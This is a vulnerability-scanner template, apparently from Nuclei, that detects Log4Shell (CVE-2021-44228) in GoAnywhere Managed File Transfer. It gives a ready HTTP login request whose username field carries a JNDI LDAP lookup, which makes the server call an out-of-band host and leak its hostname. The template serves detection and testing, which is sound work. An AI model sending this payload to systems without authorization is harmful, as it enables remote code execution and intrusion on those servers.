# Nuclei Template: GoAnywhere Managed File Transfer - Remote Code Execution (Apache Log4j)
**Template ID:** goanywhere-mft-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`goanywhere-mft-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
GoAnywhere Managed File Transfer is vulnerable to a remote command execution (RCE) issue via the included Apache Log4j.

## Steps to reproduce / Exploit Payload
```http
GET /goanywhere/auth/Login.xhtml HTTP/1.1
Host: {{Hostname}}

POST /goanywhere/auth/Login.xhtml HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}/goanywhere/auth/Login.xhtml

formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
```

## References
- https://www.goanywhere.com/cve-2021-44228-and-cve-2021-45046-goanywhere-mitigation-steps
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
